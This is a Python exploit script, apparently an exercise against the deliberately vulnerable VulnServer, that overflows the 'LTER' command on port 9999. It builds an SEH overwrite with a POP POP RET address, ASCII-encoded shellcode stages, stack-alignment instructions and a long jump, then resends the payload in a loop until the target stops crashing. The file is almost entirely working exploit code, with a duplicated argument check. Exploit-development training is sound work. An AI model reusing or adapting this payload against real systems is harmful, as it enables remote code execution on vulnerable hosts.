#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.
import time     # The module "time" provides access to runtime and sleep tracking
from socket import error as SocketError # Socket error
import errno    # Error no (Syscall error)
import os       # OS Execute Telnet




# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port
# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port


# Long Jump Shell Code Generated with https://github.com/andresroldan/Automatic-ASCII-Shellcode-Subtraction-Encoder 
JUMP_ENCODE =  b'\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x23\x7c\x21\x27\x2d'                        
JUMP_ENCODE += b'\x7f\x7a\x2c\x27\x2d\x5f\x78\x21\x21\x50\x25\x26\x2a\x4f\x3c\x25'                     
JUMP_ENCODE += b'\x41\x41\x30\x42\x2d\x61\x61\x67\x6f\x2d\x6f\x22\x70\x6f\x2d\x47'                       
JUMP_ENCODE += b'\x62\x36\x21\x50'

FIRST_STAGE =  b'\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x3e\x3e\x27\x76\x2d'
FIRST_STAGE += b'\x38\x21\x78\x61\x2d\x43\x2a\x61\x54\x50\x25\x26\x2a\x4f\x3c\x25'
FIRST_STAGE += b'\x41\x41\x30\x42\x2d\x35\x60\x62\x5e\x2d\x54\x78\x78\x22\x2d\x23'
FIRST_STAGE += b'\x6c\x64\x71\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x22'
FIRST_STAGE += b'\x3e\x5c\x32\x2d\x5f\x2d\x39\x38\x2d\x23\x38\x39\x65\x50\x25\x26'
FIRST_STAGE += b'\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x54\x44\x3e\x38\x2d\x3e\x3c'
FIRST_STAGE += b'\x21\x21\x2d\x3e\x51\x6e\x3e\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41'
FIRST_STAGE += b'\x30\x42\x2d\x36\x29\x3c\x74\x2d\x60\x39\x38\x38\x2d\x37\x41\x23'
FIRST_STAGE += b'\x25\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x28\x41\x6e'
FIRST_STAGE += b'\x60\x2d\x3e\x21\x39\x41\x2d\x36\x35\x2a\x2c\x50\x25\x26\x2a\x4f'
FIRST_STAGE += b'\x3c\x25\x41\x41\x30\x42\x2d\x39\x3c\x38\x38\x2d\x3e\x3c\x41\x38'
FIRST_STAGE += b'\x2d\x21\x26\x24\x2c\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42'
FIRST_STAGE += b'\x2d\x34\x2c\x4b\x3d\x2d\x48\x42\x2c\x22\x2d\x28\x24\x27\x34\x50'
FIRST_STAGE += b'\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x38\x23\x38\x38\x2d'
FIRST_STAGE += b'\x26\x2b\x38\x38\x2d\x3e\x45\x23\x27\x50\x25\x26\x2a\x4f\x3c\x25'
FIRST_STAGE += b'\x41\x41\x30\x42\x2d\x73\x28\x3c\x37\x2d\x6e\x60\x35\x68\x2d\x44'
FIRST_STAGE += b'\x23\x26\x32\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x30'
FIRST_STAGE += b'\x78\x23\x70\x2d\x27\x23\x28\x38\x2d\x26\x78\x4f\x26\x50'



# Generate a payload the server expects: Command followed by Data
PAYLOAD = (
    b'LTER .' +
    # Padding in the event we do not jump perfectly to the start of the array.
    # We use 'A' since the NOP command `0x90` is a bad character!
    b'A' * 16 + 
    b'\x54' +                   # PUSH ESP
    b'\x58' +                   # POP EAX
    b'\x66\x2d\x69\x02' +       # SUB AX,0x0269
    b'\x66\x2d\x69\x02' +       # SUB AX,0x0269
    b'\x66\x2d\x69\x02' +       # SUB AX,0x0269
    b'\x66\x2d\x69\x02' +       # SUB AX,0x0269 # You can comment this one out if desired.
    b'\x50' +                   # PUSH EAX
    b'\x5c' +                   # POP ESP
    FIRST_STAGE + 
    b'A' * (3574 - (16 + 20 + 79 + 4 + len(FIRST_STAGE))) +
    # Align stack for long jump
    b'\x54' +           # PUSH ESP
    b'\x58' +           # POP EAX
    b'\x2c\x30' +       # SUB AL,30
    b'\x50' +           # PUSH EAX
    b'\x5c' +           # POP ESP
    JUMP_ENCODE +
    b'A' * (79 - (6 + len(JUMP_ENCODE))) +   # Fill the rest of our buffer with A
    # JNZ SHORT +0x10: Will jump if ZF is 0
    b'\x75\x08' +
    # JZ SHORT +0x8: This will only happen if the previous jump did not happen and ZF is 1
    b'\x74\x06' +
    # 6250172B    5F                          POP EDI
    # 6250172C    5D                          POP EBP
    # 6250172D    C3                          RETN
    struct.pack('<L', 0x6250271B) +
    b'C' * 2 +
    # Align stack pointer
    b'\x54' +                   # PUSH ESP
    b'\x58' +                   # POP EAX
    b'\x66\x05\x64\x12' +       # ADD AX,0x097F
    b'\x50' +                   # PUSH EAX
    b'\x5c' +                   # POP ESP
    b'\x25\x4a\x4d\x4e\x55' +   # AND EAX,0x554E4D4A
    b'\x25\x35\x32\x31\x2a' +   # AND EAX,0x2A313235
    b'\x05\x75\x40\x48\x48' +   # ADD EAX,48484075 
    b'\x05\x76\x40\x48\x48' +   # ADD EAX,48484076
    b'\x50' +                   # PUSH EAX
    b'C' * (5000 - (3574 + 4 + 2 + 8))
)

while True:
    with socket.create_connection((HOST, PORT)) as fd:
        fd.sendall(PAYLOAD)
        time.sleep(5) # Can be adjusted. If the delay is too long, it is not efficient; If the delay is too short, the hit might be a false positive.
        try:
            fd.sendall(b'HELP')
            print('HELP')
        except SocketError as e:
            # Program crashes, continue the loop
            if e.errno == errno.ECONNRESET:
                print('Continue')
        else:
            # Program does not crash, attack succeeds
            print('Hit')
            break

#with socket.create_connection((HOST, PORT)) as fd:
#    fd.sendall(PAYLOAD)
